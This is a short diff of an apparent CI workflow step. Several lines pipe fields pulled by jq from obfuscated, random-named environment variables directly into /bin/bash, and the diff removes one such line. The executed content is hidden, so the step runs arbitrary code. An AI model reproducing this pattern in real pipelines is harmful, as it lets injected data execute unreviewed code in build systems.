@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$qxyw80" | jq -r .dob1402 | /bin/bash
           printf '%s' "$fjukb940" | jq -r .keldq96076 | /bin/bash
-          printf '%s' "$p35934" | jq -r .dsdh224 | /bin/bash
           echo $evm35 | jq -r .dq4 | /bin/bash
 
       - name: Archive artifact
